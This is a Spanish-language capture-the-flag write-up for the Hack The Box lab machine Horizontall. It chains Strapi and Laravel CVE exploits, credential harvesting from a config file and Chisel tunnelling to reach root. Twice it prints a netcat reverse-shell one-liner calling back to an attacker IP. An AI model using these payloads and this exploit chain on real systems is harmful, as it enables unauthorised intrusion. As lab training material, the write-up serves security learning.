# 

# Summary

## Info de la maquina

| VM column  | Detalles     |
| ---------- |:------------:|
| Nombre     | Horizontall  |
| Dificultad | Easy         |
| Release    | 28 Aug 2021  |
| OS         | Linux        |
| IP         | 10.10.11.105 |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.11.105** que apunte hacia **horizontall.htb** 

<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/01.png" alt="" width="713" data-align="center">

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.11.105``

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/02.png" title="" alt="" width="739">

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 22:40 -04
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 22:41 (0:00:00 remaining)
Packet Tracing disabled.
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
```

Tenemos dos puertos abiertos con sus respectivos servicios.

- Puerto 22 `SSH`  OpenSSH 7.6p1

- Puerto 80 `HTTP` nginx 1.14.0

Vamos a echarle un vistazo al puerto al puerto 80.

## 

## Website - Port 80

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/03.png)

Como es una maquina "easy" a veces sueltan alguno que otro hint en el source code pero en este caso no hay nada, es una pagina estatica, no hay mucho que hacer. 

## Vhost - BurpSuite

Usare BurpSuite a ver que puedo encontrar interesante en las peticiones entre el client(yo) y el web server. Antes de empezar a hacer algo con burp, por lo regular permito que intecepte las peticiones de JavaScript (.js), lo podemos hacer de esta forma

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/2022-02-04_19-25.png)

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/08.png" title="" alt="" width="660">

Procedemos a eliminar `^js$|` y listo. Ahora a capturar las peticiones :) 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/06.png)

Me llama la atencion esos scripts con unos nombres algo rarito, vamos a darle una ojeada.

La primera ruta `http://horizontall.htb/js/app.c68eb462.js` , me voy a descagar en mi maquina el script para no torturarme mis ojos :D

Vamos a darle un vistazo: 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/10.png)

Encontramos un VirtualHost  :), antes de seguir, vamos a ver otra forma de como conseguir el vhost.

## Vhost - Gobuster

Podemos realizar un BruteForce Directory pero en nuestro caso no nos va a dar nada interesante, asi que procederemos a realizar un **VHOST (Virtual Host )Bruteforce**

Para realizar esto, usare la herramienta `gobuster`, aun que de igual manera funcionaria `ffuf`. 

La sintaxis es bastante sencilla : 

`vhost` : Indicamos que queremos realizar una enumeracion de vhosts

`-u` : Nuestro target 

`-w` : El diccionario que queremos usar para realizar el ataque, en mi caso estamos usando uno de SecLists.

`gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt`

Encontramos algo interesante.

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/04.png" title="" alt="" width="700">

Procedemos agregarlo a nuestro archivo `/etc/hosts` 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/05.png)

## API Horizontall.

Vamos a echarle un vistazo a lo que acabamos de descubrir

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/11.png)

De nuevo, una pagina estatica(?), vamos a realizar un BruteForce Directory con `ffuf` 

La sintaxis es sencilla al igual que `gobuster`

`-w` Diccionario que usaremos para ataques, por lo regular uso uno de raft(del mismo seclists)

`-c`  Que el output salga colorizado.

`-u`  Nuestro target

Quedaria asi:

`ffuf -w /usr/share/wordlists/dirb/common.txt -c -u http://api-prod.horizontall.htb/FUZZ`

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/12.png)

Bastante rapido :) 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/13.png)

El path `/admin` me redirreciona hacia aqui, strapi es un CMS, si buscamos con `searchsploit` obtenemos lo siguiente :

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/14.png" title="" alt="" width="671">

Genial, tenemos unos cuantos exploits, pero cual es la version de este CMS?  Podemos ver si encontramos algo en Github o echarle un vistazo a los exploits.

En este caso me basto con la 2da opcion.

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/16.png" title="" alt="" width="705">

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/17.png" title="" alt="" width="741">

En este caso seria el 3er exploit, un `Remote Code Execution(RCE)`

El exploit corresponde a los CVE's CVE-2019-18818, CVE-2019-19609 , segun el articulo de Mitre, el RCE es posible debido a una mala sanitizacion de un plugin en el Admin panel 

Info : [Mitre CVE 2019-19609](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-19609)

*`python3 50239.py http: //api-prod.horizontall.htb/*`

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/18.png)

Tenemos unas nuevas credenciales de admin pero hey, tambien podemos realizar un RCE, asi que vamos a dejar netcat a la escucha por el puerto `4444` y amos a ejecutar el siguiente RCE para obtener un reverse shell

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.142 4444 >/tmp/f`

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/19.png)

Hagamos un upgrade a nuestra shell : python3 -c "import pty;pty.spawn ('/ bin/bash')"

Tenemos user.txt :)

<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/20.png" alt="" width="567">

## Privilege Escalation

Haciendo checklist basico de enumeracion en busquedad de archivo SUID, procesos, cronjobs,etc, no encontre nada hasta llegar al punto de ver las conexiones que tiene la maquina, usando `netstat -ntlp`  me doy cuenta de varios puertos a la escucha :)

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/21.png" title="" alt="" width="667">

El puerto 1337 es la instancia del API, por otro lado el puerto 3306 es de MySQL :) ....pero y el 8000? este me llama la atencion.

Si hacemos un curl al puerto 8000 obtenemos lo siguiente :

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/22.png" title="" alt="" width="708">

Esta corriendo una instancia de Laravel :)

Bien, antes de seguir me interesa saber si en los archivos de config de Strapi tengo permisos de lectura y si por casualidad hay unas credenciales.

En la ruta `/opt/strapi/myapi/config/environments/development` encontramos lo que buscabamos.

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/23.png)

```bash
Username: developer
Password: #J!:F9Zt2u
```

Intente utilizar estas credenciales via SSH pero no funcionaron.

| **mysql -u developer -p** 

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/24.png" title="" alt="" width="739">

Honestamente no nos interesa nada de la DB, asi que queda hacer un Port Fordward del puerto 8000 a nuestra maquina, en este caso con `Chisel` que es excelente para este tipo de tareas.

Utilizo Python para hacer un simple http server, y procedo a descargar chisel en la maquina

<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/25.png" alt="" width="605">

Procedo a descargar con `wget` 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/26.png)

Le damos permiso de ejecucion `chmod +x chisel` 

Bien, ahora estamos listo para hacer el Portforward, dejo dos articulos interesantes sobre esto

[Chisel Port Forward](https://www.sevenlayers.com/index.php/332-chisel-port-forward)

[Tunneling with Chisel and SSF | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)

En nuestra maquina dejamos a Chisel en escucha de la siguiente forma:

`chisel server -p 8081 --reverse`

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/27.png)

En el lado de la victima (client): 

`./chisel client 10.10.14.142:8081 R:8001:127.0.0.1:8000` 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/28.png)

Confirmamos de nuestro lado : 

<img src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/29.png" title="" alt="" width="714">

Bien, vamos a ver si esto funciona....

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/30.png)

It's works!. Laravel tiene muchisimos exploits, por suerte tenemos una version en la misma pagina, abajo a la derecha.

<img title="" src="file:///home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/31.png" alt="" width="372" data-align="center">

Googleando un poco nos topamos con este repo que contiene el PoC + el exploit: 

[GitHub - nth347/CVE-2021-3129_exploit: Exploit for CVE-2021-3129](https://github.com/nth347/CVE-2021-3129_exploit)

Siguiendo las instruccion del PoC es facil la explotacion (favor leer que hay que tener un setup de un Lab)



Nota: Si tienen algun problema con `Composer` favor actualizar las siguientes librerias y la extension xml de php :

`sudo apt install libpcre2-16-0 libpcre2-8-0 libpcre2-32-0` 

`sudo apt install php-xml` 

Y si tenemos el Lab Setup bien, lo veremos asi 

![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/34.png)



Bien, ahora a darle al exploit :D , dejamos netcat a la escucha y vamos a obtener un reverse shell con `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.142 4445 >/tmp/f` 



![](/home/g4l1l30/G4l1l30/HTB/Boxes/Retired/horizontall.htb/content/35.png)



Somos root :)
